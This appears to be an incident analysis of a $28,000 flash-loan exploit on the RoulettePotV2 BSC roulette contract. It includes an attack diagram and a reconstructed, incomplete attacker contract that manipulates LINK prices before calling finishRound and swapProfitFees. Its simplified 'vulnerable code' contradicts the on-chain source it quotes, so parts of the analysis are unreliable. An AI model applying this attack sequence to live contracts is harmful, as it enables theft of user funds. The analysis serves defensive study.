# RoulettePotV2 — Round Finalization Function Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-14 |
| **Protocol** | RoulettePotV2 |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$28,000 |
| **Attacker** | [0x0000000000004f3d...](https://bscscan.com/address/0x0000000000004f3d8aaf9175fd824cb00ad4bf80) |
| **Attack Tx** | [0xd9e0014a...](https://bscscan.com/tx/0xd9e0014a32d96cfc8b72864988a6e1664a9b6a2e90aeaa895fcd42da11cc3490) |
| **Vulnerable Contract** | [0xf573748637...](https://bscscan.com/address/0xf573748637e0576387289f1914627d716927f90f) |
| **Root Cause** | External call access on `finishRound()` and `swapProfitFees()` allowed manipulation of round end timing and theft of accumulated fees |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/RoulettePotV2_exp.sol) |

---

## 1. Vulnerability Overview

RoulettePotV2 is a roulette game contract where `finishRound()` ends a round and `swapProfitFees()` swaps accumulated profits. Both functions were externally callable without access restrictions. The attacker manipulated the LINK token price via a flash loan, then called `finishRound()` and `swapProfitFees()` in sequence to intercept the token distribution that occurs at round finalization.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: anyone can finalize a round and trigger fee swaps
function finishRound() external {
    // Only checks round end condition, no caller validation
    require(block.timestamp >= roundEndTime, "Round not ended");
    _distributeRewards();
    currentRound++;
    roundEndTime = block.timestamp + ROUND_DURATION;
}

function swapProfitFees() external {
    // Can be triggered by any external caller
    _swapAccumulatedFees();
}

// ✅ Safe code: caller restriction + price manipulation defense
function finishRound() external onlyKeeper {
    require(block.timestamp >= roundEndTime, "Round not ended");
    _distributeRewards();
    currentRound++;
    roundEndTime = block.timestamp + ROUND_DURATION;
}

function swapProfitFees() external onlyOwner {
    uint256 minOut = _getTWAPBasedMinOut();
    _swapAccumulatedFeesWithSlippage(minOut);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: contracts/Roulette/RouletteV2.sol
function initializeTokenBet(uint256 tokenId, Bet[] calldata bets) external nonReentrant {
        require(!isVRFPending, 'VRF Pending');

        Casino storage casinoInfo = tokenIdToCasino[tokenId];
        require(casinoInfo.tokenAddress != address(0), "This casino doesn't support tokens");

        IPRC20 token = IPRC20(casinoInfo.tokenAddress);
        uint256 approvedAmount = token.allowance(msg.sender, address(this));
        uint256 totalBetAmount = _getTotalBetAmount(bets);
        uint256 maxReward = getMaximumReward(bets);
        uint256 tokenPrice = isStable[casinoInfo.tokenAddress] ? 10 ** 18 : _getTokenUsdPrice(casinoInfo.tokenAddress);
        uint256 totalUSDValue = (totalBetAmount * tokenPrice) / 10 ** token.decimals();

        require(token.balanceOf(msg.sender) >= totalBetAmount, 'Not enough balance');
        require(totalBetAmount <= approvedAmount, 'Not enough allowance');
        require(maxReward <= casinoInfo.liquidity + totalBetAmount, 'Not enough liquidity');
        require(totalUSDValue <= casinoInfo.maxBet * 10 ** 18, "Can't exceed max bet limit");
        require(totalUSDValue >= casinoInfo.minBet * 10 ** 18, "Can't be lower than min bet limit");

        token.transferFrom(msg.sender, address(this), totalBetAmount);
        casinoInfo.liquidity -= (maxReward - totalBetAmount);
        casinoInfo.locked += maxReward;

        // linkSpent[tokenId] += linkPerBet;
        _saveUserBetInfo(tokenId, bets, tokenPrice);
        _updateRoundStatus();

        emit InitializedBet(roundIds, tokenId, msg.sender, totalBetAmount);
        emit LiquidityChanged(tokenId, msg.sender, casinoInfo.liquidity, casinoInfo.locked, false);
    }

// ... (lines 450-493 omitted) ...

    function requestNonce() external {
        require(!isVRFPending && roundLiveTime != 0 && block.timestamp > roundLiveTime + 120, 'Round not ended');
        _requestVRF();
    }
    function isVRFFulfilled() public view returns (bool) {
        (bool fulfilled, uint256[] memory nonces) = IVRFv2Consumer(consumerAddress).getRequestStatus(requestId);
        return fulfilled;
    }

// ... (lines 503-507 omitted) ...

    function finishRound() external nonReentrant {
        require(isVRFPending == true, 'VRF not requested');

        (bool fulfilled, uint256[] memory nonces) = IVRFv2Consumer(consumerAddress).getRequestStatus(requestId);
        require(fulfilled == true, 'not yet fulfilled');

        uint256 length = currentBetCount;
        uint256 linkPerRound = linkPerBet;
        uint256 i;

        for (i = 0; i < length; ++i) {
            BetInfo memory info = currentBets[i];
            linkSpent[info.tokenId] += (linkPerRound / length);
            _finishUserBet(info, nonces[0]);
        }

        isVRFPending = false;
        delete roundLiveTime;
        delete currentBetCount;
        emit RoundFinished(roundIds, nonces[0] % 38);
    }

// ... (lines 529-532 omitted) ...

    function _finishUserBet(BetInfo memory info, uint256 nonce) internal {
        Casino storage casinoInfo = tokenIdToCasino[info.tokenId];
        uint256 decimal = casinoInfo.tokenAddress == address(0) ? 18 : IPRC20(casinoInfo.tokenAddress).decimals();
        uint256 totalReward = _spinWheel(info.bets, nonce % 38);
        uint256 totalBetAmount = _getTotalBetAmount(info.bets);
        uint256 maxReward = getMaximumReward(info.bets);
        uint256 totalUSDValue = (totalBetAmount * info.tokenPrice) / 10 ** decimal;
        uint256 totalRewardUSD = (totalReward * info.tokenPrice) / 10 ** decimal;

        betIds++;
        if (totalReward > 0) {
            if (casinoInfo.tokenAddress != address(0)) {
                IPRC20(casinoInfo.tokenAddress).transfer(info.player, totalReward);
            } else {
                bool sent = payable(info.player).send(totalReward);
                require(sent, 'send fail');
            }
        }
        casinoInfo.liquidity = casinoInfo.liquidity + maxReward - totalReward;
        casinoInfo.locked -= maxReward;
        casinoInfo.profit = casinoInfo.profit + int256(totalBetAmount) - int256(totalReward);

        emit FinishedBet(
            info.tokenId,
            betIds,
            roundIds,
            info.player,
            nonce % 38,
            totalBetAmount,
            totalReward,
            totalUSDValue,
            totalRewardUSD,
            maxReward
        );
        emit LiquidityChanged(info.tokenId, info.player, casinoInfo.liquidity, casinoInfo.locked, true);
    }

// ... (lines 569-641 omitted) ...

    function _updateLinkConsumptionInfo(uint256 tokenId, uint256 tokenAmount) internal {
        uint256 linkOut = getLinkAmountForToken(tokenIdToCasino[tokenId].tokenAddress, tokenAmount);
        if (linkOut > linkSpent[tokenId]) linkSpent[tokenId] = 0;
        else linkSpent[tokenId] -= linkOut;
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Obtain LINK flash loan from PancakeSwap V3
  │
  ├─→ [2] Swap large amount of LINK on PancakeSwap V2
  │         └─ Manipulate LINK/BNB price
  │
  ├─→ [3] Call RoulettePotV2.finishRound()
  │         └─ Execute reward distribution based on manipulated price
  │
  ├─→ [4] Call RoulettePotV2.swapProfitFees()
  │         └─ Force fee swap at unfavorable price
  │
  ├─→ [5] Collect accumulated LINK tokens
  │
  ├─→ [6] Repay flash loan
  │
  └─→ [7] ~$28,000 profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not available — reconstructed from summary

contract RoulettePotV2Attacker {
    address constant ROULETTE = 0xf573748637e0576387289f1914627d716927f90f;
    address constant PANCAKE_V3 = /* PancakeSwap V3 Pool */;
    address constant LINK = 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD;

    function attack() external {
        // [1] LINK flash loan
        IPancakeV3Pool(PANCAKE_V3).flash(
            address(this), 0, flashAmount, ""
        );
    }

    function pancakeV3FlashCallback(...) external {
        // [2] Manipulate price by swapping large amount of LINK
        _swapLinkForBNB(linkBalance / 2);

        // [3] Force round finalization (while price is manipulated)
        IRoulettePot(ROULETTE).finishRound();

        // [4] Force fee swap (at unfavorable price)
        IRoulettePot(ROULETTE).swapProfitFees();

        // [5] Swap back in reverse direction to recover LINK
        _swapBNBForLink(bnbBalance);

        // [6] Repay flash loan
        IERC20(LINK).transfer(PANCAKE_V3, flashAmount + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Access Control + Sequencing Manipulation |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (Flash Loan + Function Call Order Manipulation) |
| **DApp Category** | GameFi / Lottery Protocol |
| **Impact** | Round reward and profit pool theft |

## 6. Remediation Recommendations

1. **Introduce keeper pattern**: Restrict `finishRound()` to be callable only by a trusted Chainlink Keeper or an authorized address
2. **VRF-based randomness**: Use Chainlink VRF for round finalization and winner determination to ensure tamper-proof randomness
3. **Price protection**: Apply TWAP-based minimum output amount during fee swaps
4. **Round finalization cooldown**: Prevent round finalization and fee swaps within the same block

## 7. Lessons Learned

- In GameFi protocols, making critical functions such as round finalization, reward distribution, and fee swaps externally callable allows attackers to trigger them at an advantageous moment.
- The same vulnerability pattern recurred as seen in JPulsepot, suggesting the two protocols shared a similar codebase or were not audited.
- Internal state transitions within a protocol (such as round finalization) should be managed through trusted external services like Chainlink Automation rather than permissionless external triggers.